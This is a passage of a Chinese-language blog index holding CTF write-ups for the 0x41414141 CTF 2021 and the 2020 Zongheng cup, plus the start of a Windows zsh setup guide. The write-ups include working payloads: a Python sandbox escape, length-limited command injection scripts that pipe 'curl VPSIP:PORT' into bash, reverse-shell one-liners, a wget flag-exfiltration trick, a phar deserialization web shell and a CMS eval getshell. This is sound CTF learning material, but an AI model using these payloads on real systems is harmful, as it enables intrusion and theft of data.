\"&gt;1:\\\\\", \"&gt;11\\\\\", \"&gt;1.\\\\\", \"&gt;11\\\\\", \"&gt;11.\\\\\", \"&gt;11.\\\\\", \"&gt;\\ \\\\\", \"&gt;rl\\\\\", \"&gt;cu\\\\\" ] for i in list1: url = baseurl + quote(str(i)) print(\"sending\", quote(i)) r = s.get(url) print('==&gt;', r.text) for j in list2: url = baseurl + quote(str(j)) print(\"sending\", quote(j)) r = s.get(url) print('==&gt;', r.text) print('sh x') r = s.get(baseurl+quote(\"sh x\")) r.encoding = 'utf-8' print('==&gt;', r.text) print('sh g') r = s.get(baseurl+quote(\"sh g\")) r.encoding = 'utf-8' print('==&gt;', r.text) s.get(reset) 参考题目0x41414141 CTF 2021 hackme: CTF | 2021 0x41414141CTF 部分 WriteUp HITCON 2017 BabyFirst Revenge: HITCON 2017 CTF BabyFirst Revenge 这个用 tar 压缩得到根目录下文件，不过前提是当前目录的文件能下载，php 倒是可以。 Baby First Revenge v2 (GitHub) 里面还有一些奇奇怪怪的操作（ 以及一些 汇总： 主要也是 HITCON 的题目（怎么这么喜欢出 命令注入突破长度限制 | 从CTF题目讲起 References &amp; Extensive Reading挖洞经验 | 命令注入突破长度限制 从一道ctf题目学到的绕过长度执行命令姿势 CTF中的命令执行绕过 （溜了喵","path":"2021/01/31/CTF_web_CommandExecutionLimitedLength/"},{"title":"CTF | 2021 0x41414141CTF 部分 WriteUp","text":"喵喵，最近 CTF 比较多，摸鱼起来比较忙，以至于好几篇博客都咕了。 噢我数数，一篇两篇，不对，已经在路上了 2333。 这篇居然就成了 2021 年的新年第一篇，那先 祝大家新年快乐喵~ （虽然晚了点，问题不大 引言 这应该是第一次来看国外的 CTF 比赛唉。 起因其实是有师傅来问我这个比赛怎么注册，准确地说是找不到注册用的 PIN code 在哪（ 然后我就顺便来看看题了 233. 当然主要还是看了 Misc 题吧。 介绍页面： https://ctf.offshift.io/ 平台网址： https://ctfd.offshift.io/ Discord： https://discord.com/invite/heKqkmWpbk 这个比赛持续了一周，从 20210124T0000 UTC+8 开始，一直到 20210131T0000 UTC+8. Secret Pin Code还卡注册，太坏了！ About 里告诉我们 The secret pin code for CTF entry is hidden somewhere on this site 于是巨多人在 discord 里问主办方这个在哪里。 根据主办方几条不同的回复，意思是就在 https://ctfd.offshift.io/ 这个 domain 下，HTML 源码里没有。 然后我和其他师傅一起找了一晚上。。 web 题目常见的地方都找了，JS 源码、HTTP2 Server Push 都去看了，都没发现。 后来想是不是 gif 隐写啊，先是看了 Top Logo，就他首页大图，或者这篇文章一开始的那张图。发现并没有。 再后来，是不是网站左上角这个 logo 啊。 也就是下面这张图。 然后发现文件最结尾隐写了。 草死了。 secret: 100100100101 PIN 一般是4-6位，于是转十进制，即 2341. 然后注册就好了。 MiscOptimizer EU instance: 207.180.200.166 9660 US instance: 45.134.3.200 9660 Level 1tower of hanoi 汉诺塔，好唉。 试了一下，他这个 list 的长度就是最初始的圆盘数量。 找了个汉诺塔的递归实现。 def move(n, a, b, c): # n为圆盘数，a代表初始位圆柱，b代表过渡位圆柱，c代表目标位圆柱 if n == 1: print(a, '--&gt;', c) else: # 将初始位的n-1个圆盘移动到过渡位，此时初始位为a，上一级函数的过渡位b即为本级的目标位，上级的目标位c为本级的过渡位 move(n-1, a, c, b) print(a, '--&gt;', c) # 将过渡位的n-1个圆盘移动到目标位，此时初始位为b，上一级函数的目标位c即为本级的目标位，上级的初始位a为本级的过渡位 move(n-1, b, a, c) 但是这里并不需要执行这个过程，只用关心移动的次数即可。 可以发现递推公式是 $ f(n)=2*f(n-1)+1 $ 于是 payload ###### level 1 ####### def solve(n, cnt=0): if n == 1: cnt += 1 return cnt cnt = solve(n-1, cnt) cnt = 2 * cnt + 1 return cnt sh = remote('45.134.3.200', 9660) # sh = remote('207.180.200.166', 9660) # level 1: tower of hanoi print('+++++++++ Level 1 ++++++++\\n') sh.recvuntil('level 1: tower of hanoi\\n') cnt = 0 while True: r = sh.recvuntil('\\n').decode().strip() if 'level' in r: break data = re.search(r'(\\[.+\\])', r).group(1) x = eval(data) print(x) length = len(x) print('-----&gt;', length) num = solve(length) print('=====&gt;', num) sh.recvuntil('&gt; ') sh.sendline(str(num)) cnt += 1 print('~~~', cnt, '~~~') # 25 发现 25次交互之后就到了第二关。 Level 2merge sort, give me the count of inversions 他的意思是，对给定的数组做归并排序，给出逆序数。 （说实话刚开始没看懂这个啥意思 inversion 逆序数Definition: 对数组a[], 存在一对 (i, j) 有i &lt; j 且 a[i] &gt; a[j] 即为一个逆序数对 e.g. {1,3,5,2,4,6} 逆序数为3 i.e. (3,2) (5,2) (5,4) mergesort 的大致思路，就是将一个数组平均分成左右两个子数组，分别调用排序函数本身，返回的是两个已排序的数组，然后再将其 merge 起来。时间复杂度是 O(n·log n)。 参考 并归排序和逆序数计算 Merge Sort and Counting Inversions 并归排序(Merge Sort)是一种使用分治法(Divided-and-Conquer)思路设计的排序算法 并归排序的过程： Divide 将n个元素分成两个包含n/2个元素的的子序列Conquer 用并归排序对两个子序列进行排序Merge 将两个已排序的子序列合并得到结果 C++ 实现： #include &lt;iostream&gt; #include &lt;fstream&gt; using namespace std; const int MAXN = 1e7 + 10; int A[MAXN]; int T[MAXN]; int Merge(int a, int mid, int b) { int count = 0; int i = a; //i为第一个序列的索引 int j = mid + 1; //j为第一个序列的索引 int k = a; //k为合并后序列的索引 while (i &lt;= mid &amp;&amp; j &lt;= b) { if (A[i] &lt;= A[j]) { T[k++] = A[i++]; } else { if (A[i] &gt;= A[j]) { T[k++] = A[j++]; count += j - k; //移动一个元素后消除的逆序数 } } } //此时两个子序列已经有一个完全被合并 把另一个序列的剩余元素合并 while (i &lt;= mid) { T[k++] = A[i++]; } while (j &lt;= b) { T[k++] = A[j++]; } //将合并后的数组复制到原数组 for (int i = a; i &lt;= b; i++) { A[i] = T[i]; } return count; //返回此次合并的逆序数 } int MergeSort(int a, int b) { if (a &lt; b) //判定序列长度是否大于1，不判定会造成无限循环 { int count = 0; int mid = (a + b) / 2; count += MergeSort(a, mid); count += MergeSort(mid + 1, b); count += Merge(a, mid, b); return count; } return 0; } int main() { fstream file(\"./input.txt\", ios::in); if (!file) printf(\"exception!\"); int i = 0; unsigned int count = 0; char s[10]; while (file &gt;&gt; s) { A[i++] = atoi(s); } cout &lt;&lt; i &lt;&lt; endl; count = MergeSort(0, i - 1); printf(\"%u\\n\", count); return 0; } 为了方便，移植到了 Python 上进行交互。 ###### level 2 ####### A = [0]*10000 T = [0]*10000 def Merge(a, mid, b): count = 0 i = a j = mid + 1 k = a while i &lt;= mid and j &lt;= b: if A[i] &lt;= A[j]: T[k] = A[i] i += 1 k += 1 else: if A[i] &gt;= A[j]: T[k] = A[j] j += 1 k += 1 count += j - k # 移动一个元素后消除的逆序数 # 此时两个子序列已经有一个完全被合并 把另一个序列的剩余元素合并 while i &lt;= mid: T[k] = A[i] i += 1 k += 1 while j &lt;= b: T[k] = A[j] j += 1 k += 1 # 将合并后的数组复制到原数组 A[a:b+1] = T[a:b+1] return count # 返回此次合并的逆序数 # level 2 : merge sort, give me the count of inversions print('+++++++++ Level 2 ++++++++\\n') cnt = 0 while True: r = sh.recvuntil('\\n').decode().strip() if 'level' in r: break data = re.search(r'(\\[.+\\])', r).group(1) x = eval(data) print('-----&gt;', x) length = len(x) A = [0]*10000 T = [0]*10000 A[:length] = x num = MergeSort(0, length - 1) print('=====&gt;', num) sh.recvuntil('&gt; ') sh.sendline(str(num)) cnt += 1 print('~~~', cnt, '~~~') # 25 # b\"you won here's your flag flag{g077a_0pt1m1ze_3m_@ll}\\n\" 25次交互之后拿到 flag。 flag{g077a_0pt1m1ze_3m_@ll} 0x414141 I think offshift promised to opensource some of their code 那就去 GitHub 上搜 offshift 好了，于是找到了一个仓库。 发现删除了一个 script.cpython-38.pyc，下载下来看看吧。 在线那个反编译不大成功，干脆直接本地反编译一下。 uncompyle6 -o scripy.py script.cpython-38.pyc 得到 import base64 secret = 'https://google.com' cipher2 = [b'NDE=', b'NTM=', b'NTM=', b'NDk=', b'NTA=', b'MTIz', b'MTEw', b'MTEw', b'MzI=', b'NTE=', b'MzQ=', b'NDE=', b'NDA=', b'NTU=', b'MzY=', b'MTEx', b'NDA=', b'NTA=', b'MTEw', b'NDY=', b'MTI=', b'NDU=', b'MTE2', b'MTIw'] cipher1 = [base64.b64encode(str(ord(i) ^ 65).encode()) for i in secret] 把 cipher1 打印出来，发现不对。 [b'NDE=', b'NTM=', b'NTM=', b'NDk=', b'NTA=', b'MTIz', b'MTEw', b'MTEw', b'Mzg=', b'NDY=', b'NDY=', b'Mzg=', b'NDU=', b'MzY=', b'MTEx', b'MzQ=', b'NDY=', b'NDQ='] 然后想到按照 cipher1 的逻辑逆向回去解 cipher2 l = [chr(int(base64.b64decode(i)) ^ 65) for i in cipher2] s = ''.join(l) print(s) # https://archive.is/oMl59 访问这个 archive 网站。 发现了一个 PDF 文件 super secret random file https://mega.nz/file/AAdDyIoB#gpj5s9N9-VnbNhSdkJ24Yyq3BWSYimoxanP-p03gQWs smashing.pdf 发现前几位和 65 异或一下，正好就是 %PDF，就是 PDF 的文件头，于是写个脚本处理一下。 （友情提醒，这里有坑，可以跳过这几段） with open('./smashing.pdf', 'rb') as fin: content = fin.read() print(content) s = '' for i in content: s += chr(i ^ 65) with open('./smashing_fix.pdf', 'wb') as fout: fout.write(s.encode()) 得到的文件，发现打开一片空白。 再看 hex，在文件结尾发现了熟悉的压缩包。 而且可以看到里面有个 flag.txt 提取出来，发现文件损坏，打不开。比对了一下正常的压缩包，这改的也太多了吧。 啊啊啊啊啊，为什么啊，不对劲！ 突然，发现文件大小怎么不一样，保存出来的文件大了许多。 再回去看 python 脚本，在进行 s.encode() 之后长度变大了。看来编码这里面有问题。 得按照 byte 来逐位异或才行。 于是重写了一下脚本。 with open('./smashing.pdf', 'rb') as fin: content = fin.read() print(content) parts = [] for i in content: parts.append(bytes([i ^ 65])) x = b''.join(parts) print(len(x)) with open('./smashing_fix.pdf', 'wb') as fout: fout.write(x) 或者，用 bytearray # Or parts = bytearray() for i in content: parts.append(i ^ 65) with open('./smashing_fix1.pdf', 'wb') as fout: fout.write(parts) 好坑啊！ 再打开来看，这就对了嘛！Bitcoin 讲究。 zip 暴力破解一下密码，为 passwd。 解压得到 flag flag{1t_b33n_A_l0ng_w@y8742} 喵呜，老套娃了！ pyjail Escape me plz. EU instance: 207.180.200.166 1024 US instance: 45.134.3.200 1024 源码如下。 #!/usr/bin/env python3 import re from sys import modules, version banned = \"import|chr|os|sys|system|builtin|exec|eval|subprocess|pty|popen|read|get_data\" search_func = lambda word: re.compile(r\"\\b({0})\\b\".format(word), flags=re.IGNORECASE).search modules.clear() del modules def main(): print(f\"{version}\\n\") print(\"What would you like to say?\") for _ in range(10): text = input('&gt;&gt;&gt; ').lower() check = search_func(banned)(''.join(text.split(\"__\"))) if check: print(f\"Nope, we ain't letting you use {check.group(0)}!\") break if re.match(\"^(_?[A-Za-z0-9])*[A-Za-z](_?[A-Za-z0-9])*$\", text): print(\"You aren't getting through that easily, come on.\") break else: exec(text, {'globals': globals(), '__builtins__': {}}, {'print':print}) if __name__ == \"__main__\": main() 噫，是 Python 沙箱 啊！就和 SSTI 差不多啦。 是绕绕绕好了，这题和平常的沙箱逃逸还有点不一样，就是他限制了执行的 globals 和 locals，还把 sys.modules 都删了。 先在本地试着跑一下，把过滤的部分都注释掉。 来看看 globals 里有啥呢。 可以发现，虽然全局的 __builtins__ 么得了，但在 globals 内部还是存在 __builtins__ 的，好耶！ 那我们就直接用这个好了！ 但是 getattr, reload 这类内置函数都么得了，如果在用到的模块内部需要 __import__ 的话也用不来。 试了一段时间，发现下面这个可行。 print(globals['__builtins__'].__import__('os').system('dir')) 下面看看 如何绕过过滤。 很明显字符串的话最简单直接就拼接好了，对于调用属性/方法的话，可以用 xx.__dict__[函数名](参数) 的方式来执行。 （第二步过滤好像也没啥用的亚子 于是 payload： print(globals['__builtins__'].__dict__['__imp''ort__']('o''s').__dict__['sy''stem']('ls /')) print(globals['__builtins__'].__dict__['__imp''ort__']('o''s').__dict__['sy''stem']('cat /flag.txt')) 打远程，得到 flag Extensive reading: 一文看懂Python沙箱逃逸 Python沙箱逃逸的n种姿势 python沙盒逃逸 Webhackme can you please just hack me, I will execute all your commands but only 4 chars in length EU instance US instance 访问得到 use arg cmd for running a command and arg ?reset for clearing the env 只允许4个字符的命令执行，唔，挺熟悉的题目，甚至有原题。 比如 HITCON 2017 CTF BabyFirst Revenge，这个网上巨多 WriteUp。 这个 server 是 gunicorn/19.7.1，应该是 python 起的吧。 先来看看 当前目录以及目录下有啥。 # curl \"http://207.180.200.166:8000/?cmd=pwd\" /home/ctf/code/sandbox/22229031 # curl \"http://207.180.200.166:8000/?cmd=pwd\" # curl \"http://207.180.200.166:8000/?cmd=ls%20/\" bin dev etc flag.txt home lib media mnt proc root run sbin srv sys tmp usr var 可见在沙箱里，当前目录下么得东西，flag 在根目录下。 那么就需要执行 cat /flag.txt，或者简略一点，cat /f*. 然而，不能生成带有 / 的文件名，还是得以命令的形式来执行。 但是有个 trick，用 * 可以得到当前目录下的所有目录及文件名，而且能用文件名执行命令。 当然这个是排序是按照字母顺序来的，空格=&gt;数字=&gt;字母。 于是先生成一个 名为 cat 的文件，然后再用 *+参数 就能执行命令了。 Payload： # curl \"http://207.180.200.166:8000/?cmd=&gt;cat\" # curl \"http://207.180.200.166:8000/?cmd=*%20/f*\" flag{ju57_g0tt@_5pl1t_Em3012} 就能得到 flag 了~ flag{ju57_g0tt@_5pl1t_Em3012} 其实本来是想 反弹 shell 的，本地打通了，但不知道为啥远程弹不出来（可能不通外网？ emmm VPS 上起一个 web 服务，内容为 bash -i &gt;&amp; /dev/tcp/VPSIP/PORT 0&gt;&amp;1 # 或者 nc -e /bin/sh VPSIP PORT payload: # coding: utf-8 import requests from urllib.parse import quote baseurl = \"http://207.180.200.166:8000/?cmd=\" reset = \"http://207.180.200.166:8000/?reset\" # baseurl = \"http://45.134.3.200:8000/?cmd=\" # reset = \"http://45.134.3.200:8000/?reset\" s = requests.session() s.get(reset) # 文件 x 内容为 ls -th &gt; g list1 = [ \"&gt;sl\", \"&gt;ht-\", \"&gt;g\\&gt;\", \"&gt;dir\", \"*&gt;v\", \"&gt;rev\", \"*v&gt;x\" ] # curl VPSIP:PORT|bash list2 = [ \"&gt;bash\", \"&gt;\\|\\\\\", \"&gt;11\\\\\", \"&gt;11\\\\\", \"&gt;1:\\\\\", \"&gt;11\\\\\", \"&gt;1.\\\\\", \"&gt;11\\\\\", \"&gt;11.\\\\\", \"&gt;11.\\\\\", \"&gt;\\ \\\\\", \"&gt;rl\\\\\", \"&gt;cu\\\\\" ] for i in list1: url = baseurl + quote(str(i)) print(\"sending\", quote(i)) r = s.get(url) print('==&gt;', r.text) for j in list2: url = baseurl + quote(str(j)) print(\"sending\", quote(j)) r = s.get(url) print('==&gt;', r.text) print('ls -t') r = s.get(baseurl+quote(\"ls -t\")) r.encoding = 'utf-8' print('==&gt;', r.text) print('sh x') r = s.get(baseurl+quote(\"sh x\")) r.encoding = 'utf-8' print('==&gt;', r.text) print('sh g') r = s.get(baseurl+quote(\"sh g\")) r.encoding = 'utf-8' print('==&gt;', r.text) s.get(reset) BTW, 还有其他的 trick，来总结了一下，放到下面这篇博客里了。 CTF | 限制长度下的命令执行 技巧汇总 References &amp; Extensive reading: HITCON 2017 CTF BabyFirst Revenge 这个用 tar 得到根目录下文件，不过前提是当前目录文件能下载，php 倒是可以。 Baby First Revenge v2 etc. 小结还挺好玩的，Misc 题 只有三题嘤嘤嘤，噢结束了才发现又上了两题新题，没事了。 跨年红包准备出了（咕咕咕 （溜了溜了喵~","path":"2021/01/31/CTF_2021_0x41414141/"},{"title":"CTF | 2020 纵横杯 Misc&Web WriteUp","text":"引言呜，转眼就到 2020 年末了，事情有点杂有点小多，发现有不少想做的事情咕掉了，等后面年终总结再说吧（可能这个也咕了呢 233. 前几天天天有比赛，华为 XCTF 三场顶不住，还有 DASCTF x BJDCTF4th，不过期末了队里没师傅打也没怎么看。 不过周末和队友一起打了个纵横杯，题目还是有点意思的。 平台地址： https://www.ichunqiu.com/2020zonghenghttps://race.ichunqiu.com/2020zongheng 这里写写几道题目的 WriteUp 吧。 （看了大佬们的 WP，顺便复现了几题 Misc签到 [0146, 0154, 0141, 0147, 0173, 0167, 063, 0154, 0143, 0157, 0155, 0145, 0137, 0164, 0157, 0137, 062, 0157, 0156, 0147, 0137, 0150, 063, 0156, 0147, 0137, 0142, 0145, 061, 0175] 八进制转字符串 flags = [146, 154, 141, 147, 173, 167, 63, 154, 143, 157, 155, 145, 137, 164, 157, 137, 62, 157, 156, 147, 137, 150, 63, 156, 147, 137, 142, 145, 61, 175] flag = '' for i in flags: flag += chr(int(str(i),8)) print(flag) flag{w3lcome_to_2ong_h3ng_be1} 马赛克原图： 利用 Depix 工具 https://github.com/beurtschipper/Depix python depix.py -p mosaic/mosaic.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o mosaic/output.png 得到 再结合 debruinseq_notepad_Windows10_closeAndSpaced.png 这图片人工识别一下，得到 flag。 flag{0123468abd68abd0123} 没想到之前逛 GitHub 看到的工具居然就在 CTF 题目里用到了，妙啊~ My_Secret LSB have a deep secret PASS1 is 123456 下载下来两张图片一个音频，音频听了没啥明显问题。 stego.png 拿 StegSolve 看了一下 RGB 里 LSB 都有数据。 用 https://github.com/livz/cloacked-pixel 这个工具来解密 LSB 数据，密码就是题目所给的 123456。 得到密钥为 38d668578a3686ab。 对 01 blood and wine.wav 用 DeepSound 解密。 得到密钥为 carrier。 根据图片和题目提示，用 oursecret 解密 拿到 flag flag{3072d7b4-d3f4-4d8a-bd8b-ac9285df11f2} babymaze2_beta（babymaze1 走迷宫，队友打的，不过环境关了，也没源代码，复现不了了就不写了8 这题也是走迷宫，不过每次只给出当前位置附近的 3*3 的环境情况。 附件的话倒是给了个 .so 文件，python 写的，不会逆嘤嘤嘤。 但是真没想到能非预期，学到了学到了。 Python2 input RCE __import__('os').system('cat flag') 复现成功喵~ BTW，想知道这题真正做的话怎么写（ magic_downloadrun.sh #!/bin/bash ulimit -c 0 # core dump size (kb) ulimit -t 60 # max cpu using (s/min) ulimit -u 1500 # max number of process ulimit -m 512000 # max memory (kb) cd /home/ctf stdbuf -oL echo -n \"Please enter your IP:\" read IP echo $IP|grep \"^[0-9\\.]\\{7,15\\}$\" &gt; /dev/null if [ $? -ne 0 ] then stdbuf -oL echo \"Please input a IP!\" else exec /home/ctf/wget -P /tmp $IP fi 输入一个 IP，然后 grep 判断是否格式合理。 大师傅有言，换行 \\n 再结合 echo 的 -e 参数就能绕过了。 而且这个 -e 参数在 wget 里也是存在的。 Payload: -e --post-flie=/home/ctf/flag http://vps:port/ \\\\n127.0.0.1 echo 出来结果就是 --post-flie=/home/ctf/flag http://vps:port/ 127.0.0.1 而 grep 就会匹配到最后一行的 127.0.0.1，于是就认为是合理 IP 了。 （学到了学到了 问卷调查flag{thanks_for_playing_our_games} WebezcmsYzmCMS www.zip 源码泄露 /www/common/config/config.php 配置文件 //数据库配置 'db_type' =&gt; 'pdo', // 数据库链接扩展 , 支持 pdo | mysqli | mysql 'db_host' =&gt; '127.0.0.1', // 服务器地址 'db_name' =&gt; 'admin', // 数据库名 'db_user' =&gt; 'admin', // 用户名 'db_pwd' =&gt; 'admin868', // 密码 'db_port' =&gt; 3306, // 端口 'db_prefix' =&gt; 'yzm_', // 数据库表前缀 /admin 后台弱口令登录，用户名密码同数据库配置。 adminadmin868 参考 https://www.cnblogs.com/Spec/p/11188198.html /www/yzmphp/core/class/collection.class.php 这里相对于官方源码去掉了 curl 执行，直接用 file_get_contents 来执行了。 模块管理下的 采集管理，网址配置为 vps 上一个页面，vps 上放 payload。 页面上放上一个 a 标签，构造目录穿越。 先试了试 file 协议，发现会提示 链接地址仅允许HTTP和HTTPS协议！ 再查看源码。 url_check函数 /** * URL地址检查 * @param string $url 需要检查的URL * @param string $baseurl 基本URL * @return string */ protected static function url_check($url, $baseurl) { $urlinfo = parse_url($baseurl); if(strpos($url, '://') === false) { if($url[0] == '/'){ $url = $urlinfo['scheme'].'://'.$urlinfo['host'].$url; }else{ $baseurl = $urlinfo['scheme'].'://'.$urlinfo['host'].(substr($urlinfo['path'], -1, 1) === '/' ? substr($urlinfo['path'], 0, -1) : str_replace('\\\\', '/', dirname($urlinfo['path']))).'/'; $url = $baseurl.$url; } } if(substr($url, 0, 4) != 'http') showmsg('链接地址仅允许HTTP和HTTPS协议！', 'stop'); return $url; } 可见只要构造以 http 开头的 url 即可绕过 check。 Payload: &lt;test&gt;&lt;a href=\"httpss://miaotony.xyz/../../../../../../../../flag\"&gt;meow&lt;/a&gt;&lt;/test&gt; 测试采集，得到 flag flag{de3974b7-9c59-4317-b7ab-479b4e058683} hello_php XXXCMS是一种可以综合管理网站上各种栏目的通用工具，新闻、产品、文档、下载、音乐、教学视频……，通过模版技术，他们都在同一套系统里完成更新和维护。XXXCMS 是目前国内最强大、最稳定的中小型门户网站建设解决方案之一，基于PHP、 MySQL的技术开发，全部源码开放。 www.zip 源码泄露 config.php &lt;?php error_reporting(0); $title='XXX信息管理系统'; $commnet='XXXCMS是一种可以综合管理网站上各种栏目的通用工具，新闻、产品、文档、下载、音乐、教学视频……，通过模版技术，他们都在同一套系统里完成更新和维护。XXXCMS 是目前国内最强大、最稳定的中小型门户网站建设解决方案之一，基于 PHP MySQL 的技术开发，全部源码开放。'; $logo_url='./static/default.jpg'; $admin_user='admin'; $admin_pass='admin888'; $footer=&lt;&lt;&lt;EOD &lt;script src=\"https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js\" &gt;&lt;/script&gt; &lt;script src=\"https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js\"&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; EOD; 从中得知用户名密码为 adminadmin888 在 login.php 登录，然后访问 admin.php，源码如下。 &lt;?php session_start(); include 'class.php'; if (!@$_SESSION['isadmin'] == True) { die(\"&lt;script&gt;alert('请登录');history.go(-1);&lt;/script&gt;\"); } if (!isset($_GET['upload']) &amp;&amp; !isset($_GET['update'])) { include_once 'header.php';?&gt; &lt;nav class=\"navbar navbar-light bg-light\"&gt; &lt;p&gt; &lt;button class=\"btn btn-primary\" type=\"button\" data-toggle=\"collapse\" data-target=\"#upload\" aria-expanded=\"false\" aria-controls=\"upload\"&gt; 上传网站图标 &lt;/button&gt; &lt;button class=\"btn btn-primary\" type=\"button\" data-toggle=\"collapse\" data-target=\"#update\" aria-expanded=\"false\" aria-controls=\"update\"&gt; 修改网站标题 &lt;/button&gt; &lt;button class=\"btn btn-primary\" type=\"button\" data-toggle=\"collapse\" data-target=\"#reset\" aria-expanded=\"false\" aria-controls=\"reset\"&gt; 恢复出厂设置 &lt;/button&gt; &lt;/nav&gt; &lt;/p&gt; &lt;div id=\"upload\"&gt; &lt;div class=\"card card-body\"&gt; &lt;form action=\"admin.php?upload\" method=\"POST\" enctype='multipart/form-data'&gt; &lt;input type=\"file\" name='file' value='abs'&gt; &lt;input type=\"submit\" class=\"btn btn-primary\" value='上传'&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=\"update\"&gt; &lt;div class=\"card card-body\"&gt; 垃圾老板就给我这么点钱，叫我怎么帮你做事。 &lt;form action=\"admin.php?update\" method=\"post\"&gt; &lt;input type=\"text\" name=\"lalal\" placeholder='请输入网站标题' class='form-control'&gt; &lt;input type=\"submit\" class='btn btn-primary'&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"collapse\" id=\"reset\"&gt; &lt;div class=\"card card-body\"&gt; 删库跑路的艺术就是想删就删，想恢复就恢复。 &lt;a id=\"resetbtn\" class=\"btn btn-primary\"&gt;点我重置&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;script&gt; $(\"#resetbtn\").click(function(){ xhr = new XMLHttpRequest(); xhr.open('GET', './reset.php', true); xhr.send(); location.reload(); });&lt;/script&gt; &lt;?php } else if (isset($_GET['upload'])) { $config-&gt;upload_logo(); } else if (isset($_GET['update'])) { die('&lt;script&gt;alert(垃圾老板就给我这么点钱，叫我怎么帮你做事./);history.go(-1)&lt;/script&gt;'); } echo $footer; ?&gt; index.php &lt;?php include_once('header.php');?&gt; &lt;?php if(isset($_GET['img'])&amp;&amp;file_exists($_GET['img'])){?&gt; &lt;img src=\"&lt;?php echo $_GET['img'];?&gt;\" class=\"d-inline-block align-top\" alt=\"\" loading=\"lazy\"&gt; &lt;?php } else {?&gt; &lt;img src=\"&lt;?php echo $config-&gt;logo_url;?&gt;\" class=\"d-inline-block align-top\" alt=\"\" loading=\"lazy\"&gt; &lt;?php }?&gt; &lt;p&gt;&lt;?php echo $config-&gt;comment;?&gt;&lt;/p&gt; &lt;?php echo $footer;?&gt; 可以看到，如果设置了 img 参数，则会去读取这个文件输出到页面上。 class.php &lt;?php include('config.php'); class Config{ public $title; public $comment; public $logo_url; public function __construct(){ global $title; global $comment; global $logo_url; $this-&gt;title= $title; $this-&gt;comment = $comment; $this-&gt;logo_url = $logo_url; } public function upload_logo(){ if(!empty($_FILES)){ $path='./static/'.md5(time()).'.jpg'; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],'./static/'.md5(time()).'.jpg'); } } public function update_title($title,$comment){ #垃圾老板就给我这么点钱，叫我怎么帮你做事。 } public function __destruct(){ $file = file_get_contents(pathinfo($_SERVER['SCRIPT_FILENAME'])['dirname'].'/config.php'); $file = preg_replace('/\\$title=\\'.*?\\';/', \"\\$title='$this-&gt;title';\", $file); $file = preg_replace('/\\$comment=\\'.*?\\';/', \"\\$commnet='$this-&gt;comment';\", $file); file_put_contents(pathinfo($_SERVER['SCRIPT_FILENAME'])['dirname'].'/config.php', $file); } } $config=new Config; ?&gt; __destruct 析构函数里会将配置保存到 config.php 文件中，覆盖掉当前配置。 于是就 用 phar 打反序列化 根据上面的源码写 payload &lt;?php class Config{ public $title; public $comment; public $logo_url; } @unlink(\"test.phar\"); $phar = new Phar(\"test.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub $o = new Config(); $o-&gt;title=\"';eval(\\$_POST['a']);#\"; $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 $phar-&gt;stopBuffering(); //签名自动计算 ?&gt; 生成 phar 后在 admin.php 上传。 而后访问 index.php?img=phar://./static/xxxxxxxx.jpg/test.txt 触发反序列化。 其中的 xxxxxxxx 可以通过 header 返回的 Date 转换为时间戳，再取 md5 来获得。 例如： var_dump(md5(\"1609158265\")); # string(32) \"b6e6c77a88da0935b34610e53081acb6\" 最后在 config.php 用一句话木马拿 flag。 BTW, 利用条件： ① phar 文件要能够上传到服务器端 ② 要有可用的魔术方法作为“跳板” ③ 要有文件操作函数，如file_exists()，fopen()，file_get_contents()，file() ③ 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤 References: 关于phar反序列化——BUUCTF-[CISCN2019 华北赛区 Day1 Web1]Dropbox PHP反序列化入门之phar 大家一起来审代码 小路学会了渗透基础，突然有一天特别无聊想要渗透，她请教了某大佬，大佬丢给了她一个网站地址和网站源码(www.zip)，然后，然后，小路就开始了苦逼的代码审计之旅，越是审越想和周公约会，快来救救她吧！！！ www.zip 源码泄露 /adm1n 后台弱口令登录 adminadmin 海洋CMS 有一堆洞（ 发现 GitHub 上有人提了 后台 getshell 的 issue： https://github.com/ciweiin/seacms/issues/11 在 邮件服务器设置这里把 SMTP 地址设为 ${eval($_POST[cmd])} 而后在 /data/admin/smtp.php 路径下执行木马拿 flag 即可。 小结学到了不少喵~ BTW，这比赛到最后大家疯狂交 flag，太卷了太卷了。 就先这样吧，这几天要大降温了，注意保暖w （溜了溜了喵","path":"2020/12/28/CTF_2020zongheng/"},{"title":"Install Terminal + git-bash + zsh + oh-my-zsh on Windows 10","text":"前言一直以来在 Windows 10 上一般是直接用自带的 cmd 或者 PowerShell，感觉界面是挺丑的。 另一方面在 Linux 环境下用 zsh 加了自动补全用着就贼爽，于是就想到能不能在 Windows 下也整个 zsh。 大概搜了一下，可以有以下几种选择。 WSL (Windows Subsystem for Linux, 适用于 Linux 的 Windows 子系统) + zsh CygWin + zsh Git Bash + zsh 由于已经配了虚拟机，在 Windows 10 上不大想也懒得装 WSL2（而且还占用一堆 C盘空间无法接受），而 Git 带有的 Bash 感觉是个不错的选择。 于是折腾了一下，配了个 Windows Terminal + git-bash + zsh + oh-my-zsh，感觉有点意思，这里顺便就来记录一下。 Steps0x00 安装 git bash for windows官方下载链接，点开就能弹出下载 ↓ https://git-scm.com/download/win 安装就略了，当前的最新版本是 2.29.2。安装完成后会有个 git bash 程序。 （啊，我发现忘记截图了，问题不大） 记得留意一下 Git 的安装目录，下面会用到。 例如我安装在 D:\\Program Files\\Git。 0x01 安装 zsh Zsh is a shell designed for interactive use, although it is also a powerful scripting language. Many of the useful features of bash, ksh, and tcsh were incorporated into zsh; many original features were added. The introductory document details some of the unique features of zsh. It assumes basic knowledge of the standard UNIX shells; the intent is to show a reader already familiar with one of the other major shells what makes zsh more useful or more powerful. 在下面的网站可以下载到最新的 zsh 安装包： https://packages.msys2.org/package/zsh?repo=msys&amp;variant=x86_64 下载完成后解压再解压，可以看到文件如下。 将这些文件直接解压到 Git 的安装目录下，与之前的文件进行合并，可以理解为把 zsh 当作 git bash 的一个补充安装包。 